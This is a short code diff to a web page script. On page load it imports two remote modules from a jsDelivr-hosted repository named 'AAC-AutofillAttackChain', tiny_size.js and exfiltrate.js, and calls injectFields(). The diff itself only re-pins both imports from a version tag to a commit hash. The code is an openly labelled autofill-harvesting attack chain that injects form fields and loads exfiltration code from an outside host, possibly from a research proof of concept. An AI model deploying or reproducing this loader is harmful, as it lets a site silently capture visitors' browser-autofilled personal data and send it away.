@@ -37,11 +37,11 @@
         window.addEventListener('load', () => {
             setTimeout(async () => {
                 const attackModule = await import(
-                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@v1.1.1/tiny_size.js'
+                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@37ba80c/tiny_size.js'
                 );
 
                 const exfilModule = await import(
-                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@v1.1.1/exfiltrate.js'
+                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@37ba80c/exfiltrate.js'
                 );
 
                 attackModule.injectFields();
